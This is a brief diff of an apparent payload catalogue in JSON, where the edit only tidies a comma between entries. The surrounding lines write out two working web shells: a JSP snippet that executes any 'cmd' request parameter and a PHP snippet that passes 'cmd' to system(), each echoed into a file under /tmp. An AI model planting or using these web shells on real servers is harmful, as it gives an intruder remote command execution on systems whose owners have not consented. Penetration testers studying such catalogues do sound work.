@@ -471,8 +471,7 @@
                 "command":"echo '<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>' > /tmp/cmd.jsp",
                 "comments":""
             }
-        ] 
-        ,
+        ],
         "php": [
             {
                 "command":"echo '<?php system($_REQUEST[\"cmd\"]); ?>' > /tmp/cmd.php",
